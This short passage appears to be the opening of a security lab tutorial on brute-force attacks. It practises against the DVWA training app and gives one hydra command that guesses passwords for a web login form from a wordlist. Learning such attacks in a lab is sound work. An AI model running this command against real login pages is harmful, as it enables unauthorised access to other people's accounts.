## 1. Brute Force Attack

![](https://pimages.toolbox.com/wp-content/uploads/2022/05/10131245/Critical-Steps-of-a-Brute-Force-Attack.png)
>We will use DVWA Labs To Learn Bruteforce Attacks
>We will use hydra and custom bash script to perform bruteforce attack
**Hydra**
```
hydra target.com -V -l username -P "worldlists.txt" http-get-form "/path:formusername=^USER^&formpassword=^PASS^&FormLogin=Login:F=Fail Message:H=Cookie: Cookies"
```
